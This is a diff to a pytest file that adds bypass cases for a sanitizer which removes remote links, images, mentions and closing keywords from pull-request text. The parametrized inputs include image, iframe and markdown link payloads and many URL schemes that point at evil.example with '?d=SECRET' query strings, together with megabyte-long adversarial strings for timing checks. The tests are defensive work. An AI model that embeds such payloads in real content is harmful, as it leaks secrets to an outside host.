@@ -88,6 +88,18 @@ def test_remote_images_and_links_are_removed_and_their_text_kept():
     "ssh://git@evil.example/SECRET.git", "file:///etc/SECRET", "wss://evil.example/SECRET", "git://evil.example/SECRET",
     "https://evil.example/" + "a" * 5000 + "?d=SECRET", "see:https://evil.example/SECRET",
     "htt<img src=y>ps://evil.example/SECRET", "ht<a href=z>tp</a>s://evil.example/SECRET",  # removal must not splice a new URL together
+    # round 5, S5: a tag too long for the tag pattern, or with a `<` inside it, used to survive whole
+    '<img src="https://evil.example/x.png?d=SECRET" alt="' + "x" * 600 + '">', '<img src=" //evil.example/x.png?d=SECRET" alt="' + "x" * 600 + '">',
+    '<img src=\\\\evil.example/x.png?d=SECRET alt="' + "x" * 600 + '">', "<img src=\\\\evil.example/x.png?d=SECRET <b>",
+    '<img src="//evil.example/x.png?d=SECRET" <b>', '<IMG SRC="https://evil.example/x?d=SECRET" ' + "y" * 700,
+    '<iframe src="//evil.example/SECRET" ' + "y" * 700, '<picture><source srcset="//evil.example/SECRET" ' + "y" * 700,
+    '<img src=" //evil.example/SECRET">', '<img src="\t\n //evil.example/SECRET">', '<video src="//evil.example/SECRET" ' + "y" * 700,
+    # a target that starts with whitespace or backslashes, in markdown and bare
+    "[x]( //evil.example/SECRET)", "[x](\\\\evil.example/SECRET)", "![x](  \\\\evil.example/SECRET)",
+    # more schemes, and the bare ``www.`` link GitHub makes
+    "gopher://evil.example/SECRET", "irc://evil.example/SECRET", "ircs://evil.example/SECRET", "smb://evil.example/SECRET",
+    "ldap://evil.example/SECRET", "chrome://evil.example/SECRET", "vscode://evil.example/SECRET", "vscode-insiders://evil.example/SECRET",
+    "blob:https://evil.example/SECRET", "www.evil.example/x?d=SECRET", "see www.evil.example/SECRET.",
 ])
 def test_every_bypass_the_review_found_leaves_no_destination(text):
     out = sanitize.clean(text, pr_body=True).text
@@ -99,6 +111,24 @@ def test_every_bypass_the_review_found_leaves_no_destination(text):
                                   "&lt;b&gt; &amp; &quot;quoted&quot;", "[note](docs/a.md#top)", "mail me@example.com", "the // comment"])
 def test_ordinary_text_with_brackets_colons_slashes_and_entities_is_untouched(text):
     assert sanitize.clean(text, pr_body=True).text == text
+
+
+@pytest.mark.parametrize("text", ["@victim", "@@victim", "@@@victim", "hello @@org/team", "(@@victim)", "x\n@@victim"])
+def test_a_mention_is_neutralised_however_many_at_signs_lead_it(text):
+    out = sanitize.clean(text, pr_body=True)
+    assert out.mentions == 1 and "@" not in out.text, out
+
+
+@pytest.mark.parametrize("text", ["a@@b.com", "me@example.com", "user@@host", "@ alone", "a @", "@@", "x@"])
+def test_at_signs_that_are_not_a_mention_stay(text):
+    assert sanitize.clean(text, pr_body=True).text == text
+
+
+@pytest.mark.parametrize("text", ["Fixes\u00a0#12", "Closes:\u00a0\u00a0#7", "Resolves\u00a0owner/repo#9", "fixed\u00a0:\u00a0#1"])
+def test_a_non_breaking_space_does_not_hide_a_closing_keyword(text):
+    out = sanitize.clean(text, pr_body=False)
+    assert out.closing == 1 and out.text.lower().startswith("refs"), out
+    assert not any(w in out.text.lower() for w in ("fix", "close", "resolve"))
 
 
 def test_a_bare_url_in_prose_is_removed_too():
@@ -121,11 +151,15 @@ def test_the_closing_keyword_is_neutralised_across_newlines_and_a_long_separator
     ("schemes", "http://"), ("protocol-relative", "(//"), ("link middles", "]("), ("whole tags", "<a href=x>"),
     ("encoded schemes", "&#104;"), ("escapes", "\\/"), ("closing keyword", "Fixes   \n"), ("mentions", "@a/"), ("at signs", "@"),
     ("headings", "## Testing\n"), ("colons", ":a:"), ("exclamations", "!"), ("tabs and spaces", " \t"),
+    # round 5: one long tag name, tags that never close, whitespace and backslashes before a target, runs of at signs
+    ("one long tag name", "<" + "a" * 999_999), ("long tag names", "<" + "a" * 600), ("tag names at the limit", "<" + "a" * 31 + " "),
+    ("unclosed img", "<img src=\"//x" + "a" * 600), ("img with inner tags", "<img <b <i "), ("quote and spaces", "\"" + " " * 100),
+    ("whitespace before target", "( \t\n"), ("backslash targets", "=\\\\"), ("many at signs", "@" * 100 + "a "), ("www", "www."),
+    ("closing keyword nbsp", "Fixes\u00a0\u00a0\n"),
 ])
 def test_one_megabyte_of_adversarial_text_is_cleaned_in_well_under_a_second(name, unit):
     """R3/R4: the first version took 7 to 25 seconds on 64,000 open brackets. Every pattern is linear now and the input is cut at
-    ``MAX_CHARS`` before any of it runs; the bound here is generous for a loaded CI machine (the measured time is a few
-    tens of milliseconds)."""
+    ``MAX_CHARS`` before any of it runs; the bound here is generous for a loaded CI machine (the assertion is under 1 s)."""
     import time
 
     text = unit * (1_000_000 // len(unit))
